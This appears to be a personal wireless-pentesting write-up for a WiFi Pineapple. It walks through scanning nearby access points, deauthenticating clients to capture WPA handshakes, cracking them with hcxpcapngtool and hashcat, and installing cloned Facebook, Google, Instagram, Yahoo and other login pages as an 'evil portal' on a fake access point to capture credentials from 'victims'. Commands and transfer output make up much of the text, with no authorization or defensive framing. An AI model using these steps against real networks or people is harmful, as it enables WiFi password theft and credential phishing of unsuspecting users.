# Setting Up
There are multiple ways to connect for the first time use of the device.. I connected using USB as this is highly suggested.

Once the device is powered on, you can either connect via USB or Wifi,

Once connected you have to go to http://172.16.42.1:1471/, for the first time set up it will ask for your preferred configuration, just fill in your preferred settings and will move on.

### Log in

![image](https://github.com/sudo-awk/wireless-pentesting-/assets/106952099/fcde48d6-fa48-4539-b5c4-8da9247d0572)

### Dashboard

This is what you will see after successfully setting up the device.

![image](https://github.com/sudo-awk/wireless-pentesting-/assets/106952099/dda5d6d4-d538-48fb-bcb3-0fb53d198126)

### Recon

This is where we can sniff nearby air devices, as seen we are able to detect different Access Points, their MAC address and the MAC of their client

![image](https://github.com/sudo-awk/wireless-pentesting-/assets/106952099/d796426f-740e-4beb-82d4-774406c9ff9f)

### Capture Handshake

To capture handshake file we will need to select one of the Access Points in the Recon Phase, click on the small arrow and select **start capturing** and **deauth** this attack is called **Karma Attack** from what I watched from the official hak5 videos.

![image](https://github.com/sudo-awk/wireless-pentesting-/assets/106952099/464f10c3-2561-42dc-92d4-7f4b96d790c9)

### Deauthentication 

![image](https://github.com/sudo-awk/wireless-pentesting-/assets/106952099/07baacac-2d1d-44d3-8d80-5f59714353ee)

### Cracking the handshake
Once you've successfully captured a handshake file, download the ***.pcap*** file we need to covert the pcap file to a crackable format for  ***hashcat*** or ***john_the_ripper*** , 
 to convert the file we are going to use a tool called `hcxpcapngtool` which is pre-installed in parrot, if it's not installed in your box you can run `sudo apt install hcxtools`

![image](https://github.com/sudo-awk/wireless-pentesting-/assets/106952099/c6ac5add-620f-4a71-8b2c-cc882483bdcb)

to convert I used this command `hcxpcapngtool ff:ff:ff:ff:ff_partial.pcap -o filename.hc22000 -E ssid` then it it will spit out a crackable format that we can use to crack the password, using a correct wordlist we can now get the password using ***hashcat*** with this command 
`hashcat -m 22000 filename.hc22000 wordlist -o cracked.txt`

and to show the cracked password you can run this in your terminal
`hashcat -m 22000 filename.hc22000 --show`

![image](https://github.com/sudo-awk/wireless-pentesting-/assets/106952099/8c81d3b8-eb79-4024-bf2e-2d2fee3a0d1f)

### Setting up EvilPortal

We need to download EvilPortal in the Pineapple Web Interface first... and then download the actual scripts from github

&nbsp;

### Downloading EvilPortal from PineApple Gui

First, we have to install the EvilPortal controller in the gui by going to modules and then installing EvilPortal  


![image](https://github.com/sudo-awk/wireless-pentesting-/assets/106952099/7883fe3d-4df5-45b2-8d79-b118261d5e3b)


### Downloading EvilPortal Scripts

To download the scripts I used this commands as follows

```
git clone https://github.com/kleo/evilportals.git
cd .\evilportals\
cd .\portals\
ls
Directory: C:\Desktop\pinepaple\evilportals\portals


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          3/5/2024   6:56 PM                cliqq-payload
d-----          3/5/2024   6:56 PM                facebook-login
d-----          3/5/2024   6:56 PM                google-login
d-----          3/5/2024   6:56 PM                instagram-login
d-----          3/5/2024   6:56 PM                o2-login
d-----          3/5/2024   6:56 PM                starbucks-login
d-----          3/5/2024   6:56 PM                twitter-login
d-----          3/5/2024   6:56 PM                yahoo-login
```
### Transferring portals to pineapple server
To transfer the files, we will use ***scp*** command from OpenSSH with the syntax below
```
scp -r *-login root@172.16.42.1:/root/portals/
scp -r *-login root@172.16.42.1:/root/portals/
root@172.16.42.1's password:
Permission denied, please try again.
root@172.16.42.1's password:
.disable                                                                              100%  142    33.8KB/s   00:00
.enable                                                                               100%  177    56.2KB/s   00:00
fBTqFRkifHK.css                                                                       100%  112KB   1.4MB/s   00:00
PGNbJWSeFxY.css                                                                       100%   27KB   1.4MB/s   00:00
1lDsteNqRLb.png                                                                       100% 8700     1.4MB/s   00:00
dF5SId3UHWd.svg                                                                       100% 2386   591.4KB/s   00:00
O2aKM2iSbOw.png                                                                       100% 6787     1.3MB/s   00:00
facebook-login.ep                                                                     100%   42    11.7KB/s   00:00
helper.php                                                                            100% 1290   310.4KB/s   00:00
index.php                                                                             100%   12KB   1.4MB/s   00:00
MyPortal.php                                                                          100% 1304   480.8KB/s   00:00
.disable                                                                              100%  142    48.2KB/s   00:00
.enable                                                                               100%  177    53.6KB/s   00:00
bootstrap.min.css                                                                     100%  152KB   1.6MB/s   00:00
custom.css                                                                            100% 2849   503.3KB/s   00:00
progress-bar.css                                                                      100%   16KB   1.4MB/s   00:00
OpenSans-Regular.ttf                                                                  100%   95KB   1.3MB/s   00:00
Roboto-Regular.ttf                                                                    100%  167KB   1.4MB/s   00:00
favicon.ico                                                                           100% 5430   995.1KB/s   00:00
bootstrap.min.js                                                                      100%   57KB   1.4MB/s   00:00
custom.js                                                                             100% 2444   591.6KB/s   00:00
jquery-3.4.1.min.js                                                                   100%   86KB   1.6MB/s   00:00
jquery-ui.min.js                                                                      100%  248KB   1.5MB/s   00:00
google-login.ep                                                                       100%   40    18.4KB/s   00:00
helper.php                                                                            100% 1290   355.8KB/s   00:00
index.php                                                                             100% 8318     1.4MB/s   00:00
MyPortal.php                                                                          100% 1326   400.8KB/s   00:00
README.md                                                                             100%   64    20.9KB/s   00:00
0608bd6190e0.css                                                                      100%  241    78.7KB/s   00:00
1b39124c7396.css                                                                      100%   25KB   1.5MB/s   00:00
344096cb1b73.css                                                                      100% 5591     1.1MB/s   00:00
6c761c8cd379.css                                                                      100%  149KB   1.4MB/s   00:00
c71018ea1251.css                                                                      100%  121KB   1.6MB/s   00:00
style.css                                                                             100%   40    11.7KB/s   00:00
177140221987.jpg                                                                      100%   75KB   1.4MB/s   00:00
180ae7a0bcf7.png                                                                      100% 3754   631.0KB/s   00:00
32f0a4f27407.png                                                                      100%   75KB   1.5MB/s   00:00
36b3ee2d91ed.ico                                                                      100% 5430   969.6KB/s   00:00
43cc71bb1b43.png                                                                      100%  107KB   1.5MB/s   00:00
5e04169b9308.jpg                                                                      100%   78KB   1.5MB/s   00:00
9144d6673849.jpg                                                                      100%  100KB   1.6MB/s   00:00
9364675fb26a.png                                                                      100%  395KB   1.4MB/s   00:00
b27a108592d8.jpg                                                                      100%   57KB   1.5MB/s   00:00
bcd90c1d4868.png                                                                      100%  186KB   1.5MB/s   00:00
e9cd846dc748.png                                                                      100%   10KB   1.5MB/s   00:00
ff2c097a681e.jpg                                                                      100%   50KB   1.5MB/s   00:00
jquery-3.5.1.min.js                                                                   100%   87KB   1.4MB/s   00:00
helper.php                                                                            100% 1290   328.1KB/s   00:00
index.php                                                                             100%   16KB   1.4MB/s   00:00
instagram-login.ep                                                                    100%   43    10.3KB/s   00:00
MyPortal.php                                                                          100% 1304   361.8KB/s   00:00
.disable                                                                              100%  142    49.6KB/s   00:00
.enable                                                                               100%  177    60.3KB/s   00:00
fonts.css                                                                             100%  671   168.2KB/s   00:00
normalize.min.css                                                                     100% 3053   706.5KB/s   00:00
style.css                                                                             100% 2557   521.1KB/s   00:00
Lato-700.woff2                                                                        100%   16KB   1.5MB/s   00:00
Lato-regular.woff2                                                                    100%   16KB   1.3MB/s   00:00
logo-o2.svg                                                                           100%  787   211.0KB/s   00:00
logo-white.png                                                                        100%   37KB   2.0MB/s   00:00
ymwp832k1s.png                                                                        100% 1321   224.1KB/s   00:00
helper.php                                                                            100% 1290   372.2KB/s   00:00
index.php                                                                             100% 2662   601.5KB/s   00:00
jquery-2.2.1.min.js                                                                   100%   84KB   1.6MB/s   00:00
license.txt                                                                           100% 1142   335.6KB/s   00:00
MyPortal.php                                                                          100% 1401   388.1KB/s   00:00
o2-login.ep                                                                           100%   36    11.7KB/s   00:00
.disable                                                                              100%  142    43.2KB/s   00:00
.enable                                                                               100%  177    80.3KB/s   00:00
bootstrap.min.css                                                                     100%  118KB   1.5MB/s   00:00
style.css                                                                             100% 4191   986.2KB/s   00:00
5atoko1sqg.png                                                                        100%  650KB   1.4MB/s   00:00
pa6dyy5wcc.png                                                                        100%  585KB   1.4MB/s   00:00
s5g1cxz9vr.png                                                                        100% 2603   627.4KB/s   00:00
helper.php                                                                            100% 1290   323.8KB/s   00:00
index.php                                                                             100% 8471     1.7MB/s   00:00
jquery-2.2.1.min.js                                                                   100%   84KB   1.8MB/s   00:00
MyPortal.php                                                                          100% 1304   275.9KB/s   00:00
starbucks-login.ep                                                                    100%   43    13.1KB/s   00:00
.disable                                                                              100%  142    43.3KB/s   00:00
.enable                                                                               100%  177    70.6KB/s   00:00
bootstrap.min.css                                                                     100%  118KB   1.5MB/s   00:00
style.css                                                                             100% 3723   920.2KB/s   00:00
j35g5c9082.png                                                                        100% 1313   353.2KB/s   00:00
oxvhareuw0.png                                                                        100% 9732     1.6MB/s   00:00
helper.php                                                                            100% 1290   230.1KB/s   00:00
index.php                                                                             100% 4409     1.0MB/s   00:00
jquery-2.2.1.min.js                                                                   100%   84KB   1.0MB/s   00:00
MyPortal.php                                                                          100% 1304   281.1KB/s   00:00
twitter-login.ep                                                                      100%   41     9.9KB/s   00:00
.disable                                                                              100%  142    35.8KB/s   00:00
.enable                                                                               100%  177    45.9KB/s   00:00
yahoo-main.css                                                                        100%  524KB   1.4MB/s   00:00
Yahoo_Sans-Medium.woff2                                                               100%   29KB   2.0MB/s   00:00
Yahoo_Sans-Regular.woff2                                                              100%   28KB   1.6MB/s   00:00
Yahoo_Sans-Semibold.woff2                                                             100%   28KB   1.6MB/s   00:00
yahoo-apple-touch-v0.0.2.png                                                          100%   12KB   1.8MB/s   00:00
yahoo-favicon-img-v0.0.2.ico                                                          100% 1406   344.2KB/s   00:00
yahoo_frontpage_en-US_s_f_p_bestfit_frontpage_2x.png                                  100% 1346   339.6KB/s   00:00
yahoo_frontpage_en-US_s_f_w_bestfit_frontpage_2x.png                                  100% 1391   371.4KB/s   00:00
helper.php                                                                            100% 1290   345.3KB/s   00:00
index.php                                                                             100% 4932   784.2KB/s   00:00
MyPortal.php                                                                          100% 1304   320.4KB/s   00:00
yahoo-login.ep                                                                        100%   39    13.5KB/s   00:00
```

And that's it, we successfully installed the evil portal modules.... we can now use them to redirect our victims to our modules.
Back to the Pineapple evilportal gui, I enabled the facebook login as the capture portal


![image](https://github.com/sudo-awk/wireless-pentesting-/assets/106952099/71033598-dfc3-4217-b6d0-a8c70923bc2b)


Connecting to the newly deployed fake access point, this is what I see as the victim


![image](https://github.com/sudo-awk/wireless-pentesting-/assets/106952099/ea758e46-6ec8-4b55-96c9-cb2313748b8c)



